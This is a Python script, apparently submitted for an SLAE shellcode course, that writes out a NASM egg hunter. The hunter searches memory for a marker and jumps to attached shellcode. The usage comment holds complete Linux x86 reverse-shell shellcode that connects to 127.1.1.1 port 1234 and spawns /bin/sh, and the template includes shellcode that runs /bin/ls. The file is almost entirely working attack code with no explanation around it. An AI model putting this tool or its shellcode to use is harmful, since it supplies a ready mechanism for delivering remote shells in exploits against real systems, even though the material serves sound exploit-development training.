# SLAE Assignment 3.
# egg_hunter_generator
# StudentID : SLAE-1133
# usage: python3 egg_hunter_generator.py --file egg_hunter.nasm --sc "\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31\xd2\x31\xc0\x66\xb8\x67\x01\xcd\x80\x31\xdb\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x66\x6a\x02\x31\xc9\x89\xe1\x31\xd2\xb2\x10\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\xb1\x01\x31\xc0\xb0\x3f\xcd\x80\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x31\xc0\x31\xdb\x53\x89\xe2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x51\x53\x89\xe1\xb0\x0b\xcd\x80"

import argparse


def encode_shellcode(byte_shellcode):
    encoded2 = ""
    for x in byte_shellcode:
        y = x
        # print(f"{str(x)}:{str(y)}")
        encoded2 += '0x'
        encoded2 += '%02x,' % y

    return encoded2


def get_egg_hunter(payload):
    shellcode = r"""  
global _start

section .text

_start:
    mov ebx,0x50905090
    xor ecx,ecx
    mul ecx

nine:
    or dx,0xfff

fourteen:
    inc edx
    pusha
    lea ebx,[edx+0x04]
    mov al,0x21
    int 0x80
    cmp al,0xf2
    popa
    jz nine
    cmp [edx],ebx
    jnz fourteen
    cmp [edx+0x4],ebx
    jnz fourteen
    jmp edx

garbage: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x6c,0x73,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x31,0xc9,0x51,0xb1,0x2f,0x51,0x31,0xc9,0x89,0xe1,0x50,0x89,0xe2,0x51,0x53,0x31,0xc9,0x89,0xe1,0xb0,0x0b,0xcd,0x80
egg: db 0x90,0x50,0x90,0x50,0x90,0x50,0x90,0x50
shellcode: db {}
    """.format(payload)

    return shellcode


parser = argparse.ArgumentParser(description='Generate Egg Hunter for SLAE Assignment 3.')
parser.add_argument("-sc", "--sc", type=str, default="", help="Shellcode to be used for the payload.")
parser.add_argument("-file", "--file", type=str, default="egg_hunter.nasm", help="egg hunter nasm file to be generated.")
args = parser.parse_args()
sc = args.sc
output_file = args.file

raw_payload = bytes.fromhex(sc.replace("\\x", "").replace('"', ''))
fixed_payload = encode_shellcode(raw_payload)
egg_hunter = get_egg_hunter(fixed_payload)

out_file = open(output_file, "w+")
out_file.write(egg_hunter)
out_file.close()

print(f"Egg Hunter Nasm file generate {output_file}")
